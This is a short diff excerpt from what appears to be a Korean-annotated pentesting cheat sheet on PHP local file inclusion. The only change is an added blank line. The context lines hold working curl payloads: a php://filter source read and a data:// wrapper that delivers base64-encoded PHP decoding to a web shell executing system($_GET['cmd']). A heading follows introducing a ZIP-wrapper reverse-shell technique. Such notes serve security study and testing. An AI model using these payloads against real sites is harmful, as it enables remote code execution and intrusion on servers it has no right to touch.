@@ -66,6 +66,7 @@ curl https://example.com/index.php?page=php://filter/convert.base64-encode/resou
 curl "https://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
 → `data://` 래퍼로 Base64 인코딩된 PHP 코드 전달 후 `ls` 실행
+
 ---
 # PHP ZIP Wrapper LFI
 1. Create a PHP Reverse shell
